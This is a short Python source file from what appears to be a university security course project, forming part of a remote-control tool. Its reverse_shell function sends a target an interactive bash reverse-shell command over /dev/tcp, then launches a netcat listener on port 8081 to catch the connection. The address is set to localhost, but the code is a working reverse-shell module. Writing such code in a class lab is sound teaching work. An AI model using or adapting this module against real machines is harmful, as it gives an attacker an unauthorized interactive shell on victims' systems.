# ===---------------------------------------------------------------------=== #
#
# CPSC4240 Project, Fall 24
# Adam Clements, Evan Cox, Isaac Fletcher, Tim Koehler
#
# ===---------------------------------------------------------------------=== #

from context import GlobalContext, Command
import asyncio
import subprocess

LISTEN_ADDR = "127.0.0.1"
LISTEN_PORT = "8081"

async def reverse_shell(ctx: GlobalContext, id: str) -> None:
    # requires double `bash` execution due to redirection. Note that `/dev/tcp` is
    # a pseudo-device that ONLY BASH SUPPORTS
    #
    # connects to a reverse shell on 8081
    cmd = Command.execute(
        "/bin/bash", ["-c", f"sleep 3 && bash -i >& /dev/tcp/{LISTEN_ADDR}/{LISTEN_PORT} 0>&1"])

    ctx.command_one(id, cmd)

    # changed to x-terminal-emulator to support non-gnome systems
    subprocess.Popen(["x-terminal-emulator", "-e", f"nc -lnvp {LISTEN_PORT}"])
